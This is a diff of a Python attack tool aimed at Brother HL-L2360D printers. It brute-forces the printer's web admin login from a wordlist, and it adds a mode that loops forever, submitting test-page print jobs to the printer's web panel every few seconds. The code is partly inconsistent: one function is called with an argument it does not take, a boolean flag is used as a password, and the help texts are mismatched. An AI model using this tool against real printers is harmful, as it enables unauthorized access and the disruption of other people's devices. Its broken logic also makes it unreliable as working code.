@@ -1,7 +1,9 @@
 import requests
 import logging
 import argparse
-t_format = '[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s'
+import time
+
+t_format = '[%(asctime)s] %(levelname)s - %(message)s'
 d_format = '%H:%M:%S'
 logging.basicConfig(
     filename='ohbrother.log', 
@@ -20,6 +22,8 @@ logger = logging.getLogger(__name__)
 
 COMMON_PASSWORDS = ["initpass", "access"]
 
+PASSWORD_KEY = "B1d6"
+
 class Brother:
     def __init__(self, ip_address: str, port: int, wordlist: str) -> None:
         """ 
@@ -27,19 +31,43 @@ class Brother:
         :param port: Port of the web server running on the printer
         :param wordlist: Password wordlist file
         """
-        self.url = f"http://{ip_address}:{port}/general/status.html"
+        self.url = f"http://{ip_address}:{port}/"
+        self.status_url = self.url + "general/status.html"
         self.wordlist = wordlist
         self.default_password = "initpass"
 
+    def send_test_sheet(self) -> bool:
+        """ Prints a test sheet
+        """
+        payload: dict = {
+            "B10b": "",
+            "pageid":4
+        }
+        test_sheet_url = f"{self.url}general/lists.html"
+        resp = requests.post(test_sheet_url, data=payload)
+        return resp.ok
+
+    def send_spam_loop(self, password: str):
+        """ Spam prints test pages
+        """
+        while True:
+            try:
+                if self.send_test_sheet(password):
+                    logging.info("[*] queued priting a test page")
+                else:
+                    logging.error("[*] Failed to queue a test sheet")
+                time.sleep(3)
+            except KeyboardInterrupt:
+                return
 
     def login(self, password: str) -> bool:
         """ Sends a login request to the printer
         """
         payload: dict = {
-            "B1d6": password,
+            PASSWORD_KEY: password,
             "loginurl":"/general/"
         }
-        resp = requests.post(self.url, data=payload)
+        resp = requests.post(self.status_url, data=payload)
         # The loginurl is invalid so we get a 404 when we login successfully
         return resp.status_code == 404
 
@@ -73,7 +101,11 @@ def main(args):
     wordlist = args.get("wordlist")
     port = args.get("port")
     brother = Brother(ip_address, port, wordlist)
-    brother.dictionary_attack()
+    if args.get("dictionary_attack"):
+        return brother.dictionary_attack()
+    password =  args.get("print_spam")
+    if password:
+        brother.send_spam_loop(password)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)")
@@ -89,6 +121,18 @@ if __name__ == "__main__":
         help=f"Port the admin interface is running on (default: 80)", 
         default=80,
         type=int
+    )
+    parser.add_argument(
+        "--dictionary-attack",
+        "-D",
+        help=f"IP Address of the printer", 
+    )
+    parser.add_argument(
+        "--print-spam",
+        "-S",
+        help=f"continuously print test pages (unauthenticated)", 
+        default=False,
+        action="store_true"
     )
     parser.add_argument(
         "--wordlist",
